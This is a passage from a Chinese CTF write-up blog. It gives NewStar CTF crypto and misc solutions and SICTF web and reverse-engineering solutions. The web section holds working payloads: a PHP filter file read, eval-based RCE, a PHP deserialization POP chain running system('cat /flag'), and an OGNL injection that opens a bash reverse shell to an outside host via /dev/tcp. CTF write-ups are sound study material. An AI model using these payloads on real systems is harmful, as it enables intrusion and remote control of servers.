ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=</span><br><span class="line">part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=</span><br><span class="line">part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`</span><br></pre></td></tr></table></figure><p>part1 是base64，part2是base32，part3是uuencode。</p><p>最后得到flag：<code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p><h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, key</span><br><span class="line"></span><br><span class="line">modulus = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append((key[<span class="number">0</span>]*f + key[<span class="number">1</span>]) % modulus)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span></span><br></pre></td></tr></table></figure><p>根据flag头，可以列出两个方程：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1): (key[0]*&#x27;f&#x27;+key[1])%256=0xdd</span><br><span class="line">(2): (key[0]*&#x27;l&#x27;+key[1])%256=0x43</span><br></pre></td></tr></table></figure><p>（2）-（1）,即可得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(key[0]*6)%256=-154</span><br></pre></td></tr></table></figure><p>即可求出key[0]为 17，将key[0]代入，求出key[1]为23。</p><p>最后写脚本求出flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">256</span>-<span class="number">154</span>+<span class="number">256</span>*i)%<span class="number">6</span>==<span class="number">0</span>:</span><br><span class="line">        a=(<span class="number">256</span>-<span class="number">154</span>+<span class="number">256</span>*i)//<span class="number">6</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">b=<span class="number">0xdd</span>-(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>)*a)%<span class="number">256</span>       </span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">c=<span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(c):</span><br><span class="line">    c1=c[i]+c[i+<span class="number">1</span>]</span><br><span class="line">    c2=<span class="built_in">int</span>(c1,<span class="number">16</span>)</span><br><span class="line">    i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> (a*j + b) % <span class="number">256</span>==c2 :</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_ = pad(flag)</span><br><span class="line">    key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="number">1</span>)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    enc_flag = aes.encrypt(flag_)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line"><span class="comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br></pre></td></tr></table></figure><p>根据源码，可以知道key的前后两段是一样的，vi再和aa异或后取后半段。所以我们可以得出key和vi。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">aa= <span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line">a=long_to_bytes(aa)</span><br><span class="line"></span><br><span class="line">key1 = a[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">iv=long_to_bytes(bytes_to_long(key1) ^ aa^<span class="number">1</span>)</span><br><span class="line">key=key1+key1</span><br><span class="line">iv=iv[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">c= <span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag=aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;firsT_cry_Aes\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h2><p>用CyberChef的megic方法即可得到flag。</p><p><img src="/NewStar-CTF-Week1/m_1_1.png"></p><h2 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h2><p>kali使用zsteg即可得到flag。</p><p><img src="/NewStar-CTF-Week1/m_2_1.png"></p><h2 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h2><p>Wireshark打开pacp文件，发现有很多http流量 。</p><p>过滤出返回200的包，可以看到有一个类似base64的返回包，猜测是flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</span><br></pre></td></tr></table></figure><p><img src="/NewStar-CTF-Week1/m_3_1.png"></p><p>base64解码2次即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</span><br></pre></td></tr></table></figure><h2 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h2><p>是<code>whitespace</code>，用 <a href="https://vii5ard.github.io/whitespace/">在线网站</a> 即可得到flag。</p><p><img src="/NewStar-CTF-Week1/m_4_1.png"></p><h2 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h2><p><code>silenteye</code>，用<code>silenteye</code>打开点击decode即可得到flag。</p><p><img src="/NewStar-CTF-Week1/m_5_1.png"></p><h2 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h2><ol><li><p>文件用010打开，修复文件头即可解压出<code>flag.zip</code>。</p></li><li><p><code>flag.zip</code>，因为被修改了数据区，所以文件损坏。找一个正确加密的zip包对着改回来即可。</p></li><li><p>在压缩包的注释区发现了base64编码，解码后得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I like six-digit numbers because they are very concise and easy to remember.</span><br></pre></td></tr></table></figure><p>可知压缩包密码是6位数字。</p></li><li><p>爆破压缩包密码，得到，密码为<code>232311</code>，解压后即可得到flag为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
          <category> 新生赛 </category>
          
          <category> ak </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF</title>
      <link href="/SICTF/"/>
      <url>/SICTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到-Include"><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h2><p>简单的文件包含，用伪协议读<code>/flag</code>即可得到flag.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?SICTF=php://filter/read=/resource=/flag</span><br></pre></td></tr></table></figure><p><img src="/SICTF/w_1_1.png"></p><h2 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h2><ol><li><p>先是php变量的特性，会将<code>[</code>, <code>+</code>, <code>.</code> 等特殊字符解析成<code>_</code>  。</p></li><li><p>绕过preg_match，因为是单行匹配，我们可以用换行绕过(<code>%0a</code>)，</p></li><li><p>接下来是无参数RCE，参考<a href="https://xz.aliyun.com/t/9360">这个博客</a> 。</p></li><li><p>利用<code>get_defined_vars()</code>，可以成功执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get: ?k+e[y=123%0a&amp;b=phpinfo();</span><br><span class="line"></span><br><span class="line">post: command=eval(end(current(get_defined_vars())));</span><br></pre></td></tr></table></figure><p><img src="/SICTF/w_2_1.png"></p></li><li><p>最后在根目录找到flag。</p><p><img src="/SICTF/w_2_2.png"></p></li></ol><h2 id="pain"><a href="#pain" class="headerlink" title="pain"></a>pain</h2><p>参考博客：<a href="https://xz.aliyun.com/t/10482#toc-7">https://xz.aliyun.com/t/10482#toc-7</a></p><ol><li><p>用<code>jd-gui</code>查看jdk文件的内容。</p></li><li><p>在<code>pain.class</code>内，可以知道这是<code>Ognl的解析漏洞</code>。</p><p><img src="/SICTF/w_3_1.png"></p></li><li><p>跟进<code>dinner_waf.let_me_see_see</code>方法，可以看到waf。</p><p><img src="/SICTF/w_3_2.png"></p></li><li><p>可以看到，在检测waf前，会对payload进行一次url解码。尝试用<code>unicode编码</code>来绕过，发现可行。</p><p><img src="/SICTF/w_3_3.png"></p></li><li><p>最后用这两条poc中的其中一个来进行反弹shell。</p><p><img src="/SICTF/w_3_4.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#编码前</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/7654du6216.zicp.fun/33699 0&gt;&amp;1&quot;&#125;)).start()</span><br><span class="line">#编码后</span><br><span class="line">/start?payload=(new%20java.lang.%5Cu0050%5Cu0072%5Cu006f%5Cu0063%5Cu0065%5Cu0073%5Cu0073%5Cu0042%5Cu0075%5Cu0069%5Cu006c%5Cu0064%5Cu0065%5Cu0072(new%20java.lang.String%5B%5D%7B%22bash%22%2C%22-c%22%2C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F7654du6216.zicp.fun%2F33699%200%3E%261%22%7D)).start()</span><br></pre></td></tr></table></figure><p><img src="/SICTF/w_3_5.png"></p></li></ol><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><ol><li><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></li><li><p>过滤了<code>(</code>，<code>.</code> ，但发现反引号没被过滤，可以用反引号来rce，查看根目录的flag即可。</p></li><li><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post: code=echo `ls /`;</span><br></pre></td></tr></table></figure></li></ol><h2 id="我全都要"><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h2><ol><li><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pop</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nogame</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/233333333/&quot;</span>,<span class="variable">$this</span>-&gt;pop))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;扣1送地狱火&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;i = <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;nogame-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;必须执行&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boy</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I also want to fall in love&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;girl != <span class="variable language_">$this</span>-&gt;boy &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;girl) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;boy))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Aec-&gt;<span class="title function_ invoke__">game</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$MyLover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;有对象我会在这打CTF???看我克隆一个对象！&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="string">&quot;game&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;打游戏去，别想着对象了&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;MyLover = <span class="keyword">clone</span> <span class="keyword">new</span> B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;A_B_C&quot;</span>])&#123;</span><br><span class="line">    <span class="variable">$poc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;A_B_C&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>思路：</p><ol><li>利用class B 的 <code>__clone</code>来rce。</li><li>class P 的 <code>__call</code>能实现1。</li><li>class B的 <code>game</code>能实现2。</li><li>class A的<code>__toString</code>能实现3。</li><li>class B 的 <code>__destruct</code>能实现4。</li><li>用数组绕过md5。</li><li>用<code>preg_match</code>触发<code>__tostring</code>。</li></ol></li><li><p>pop链：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pop</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nogame</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boy</span>=<span class="keyword">array</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$MyLover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;pop=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;pop-&gt;Aec=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;pop-&gt;Aec-&gt;nogame=<span class="keyword">new</span> <span class="title function_ invoke__">p</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;N;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;N;&#125;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;i:1;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;i:2;&#125;&#125;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/SICTF/w_5_1.png"></p></li><li><p>查看根目录的flag即可。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: ?A_B_C=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;Aec&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;P&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;MyLover&quot;</span>;N;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;girl&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;i:<span class="number">1</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;boy&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;i:<span class="number">2</span>;&#125;&#125;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">post: cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h2><ol><li><p>题目要求要快，且每次上传文件后发现文件都被删除了，所以想到了文件上传的条件竞争。</p></li><li><p>用bp来弄条件竞争，先用bp的爆破无限制地上传文件，再另开一个爆破不断地访问，最后得到flag。</p><p><img src="/SICTF/w_6_1.png"></p><p><img src="/SICTF/w_6_2.png"></p></li></ol><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h2><ol><li><p>ida32打开文件，在<code>_main_0</code>函数看到一串类似base64的字符串。</p><p><img src="/SICTF/r_1_1.png"></p></li><li><p>跟进<code>sub_4110F5</code>函数，直到<code>sub_411890</code>，发现这段函数实现了一个base64的编码。</p></li><li><p>找表。</p><p><img src="/SICTF/r_1_2.png"></p></li><li><p>解码后得到flag。</p><p><img src="/SICTF/r_1_3.png"></p></li></ol><h2 id="MyObject"><a href="#MyObject" class="headerlink" title="MyObject"></a>MyObject</h2><ol><li><p>查看main函数，发现一个名为rc4的函数，猜测是rc4加密，且看到key为<code>SIFLAG</code>。</p><p><img src="/SICTF/r_2_1.png"></p></li><li><p>看到这几个变量有值，猜测这是加密后的密文。</p><p><img src="/SICTF/r_2_2.png"></p></li><li><p>网上找一个解rc4的脚本改一下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># RC4加密和解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KSA</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="comment"># 初始化S盒</span></span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># 交换S[i]和S[j]</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRGA</span>(<span class="params">S</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># 交换S[i]和S[j]</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="comment"># 加密函数，返回加密后的字节流</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">        data_length = <span class="built_in">len</span>(data)</span><br><span class="line">        keystream = PRGA(KSA(key))</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data_length):</span><br><span class="line">            res.append(<span class="built_in">next</span>(keystream) ^ data[i])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line">    <span class="comment"># 解密函数，返回解密后的字节流</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">        <span class="keyword">return</span> encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> encrypt, decrypt</span><br><span class="line"><span class="comment"># 示例：</span></span><br><span class="line">key = <span class="string">b&#x27;SIFLAG&#x27;</span></span><br><span class="line">encrypt_func, decrypt_func = RC4(key)</span><br><span class="line">a=[<span class="string">b&#x27;G\xCF&quot;Z\x0E\xD3\&#x27;0&#x27;</span>,<span class="string">b&#x27;\xE5\vkG&#x27;</span>,<span class="string">b&#x27;\a\x85\xC3\x99\xBAS\x8D&#x27;</span>,<span class="string">b&#x27;\x9F\x88\xFE\x10w\x1C\x01\a&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decrypted Data:&#x27;</span>, decrypted_data)</span><br><span class="line">decrypted_data=decrypt_func(a[<span class="number">0</span>][::-<span class="number">1</span>]+a[<span class="number">1</span>][::-<span class="number">1</span>]+a[<span class="number">2</span>][::-<span class="number">1</span>]+a[<span class="number">3</span>][::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decrypted Data:&#x27;</span>, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Decrypted Data: b&#x27;SICTF&#123;wow_you_get_the_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>解码的过程中发现，从第三个字符串开始会乱码，去掉第三个字符串的<code>\xE5</code>，后边即可正常解码。</p></li></ol><h2 id="不一样的base64"><a href="#不一样的base64" class="headerlink" title="不一样的base64"></a>不一样的base64</h2><ol><li><p>使用 <a href="https://gitcode.net/mirrors/extremecoders-re/pyinstxtractor?utm_source=csdn_github_accelerator">pyinstxtractor</a>  反编译exe。</p></li><li><p>用 <a href="https://tool.lu/pyc">在线网站</a> 反编译<code>111.pyc</code>。</p><p><img src="/SICTF/r_3_1.png"></p></li><li><p>base64解码即可得到flag。</p><p><img src="/SICTF/r_3_2.png"></p></li></ol><h2 id="签到-PYC"><a href="#签到-PYC" class="headerlink" 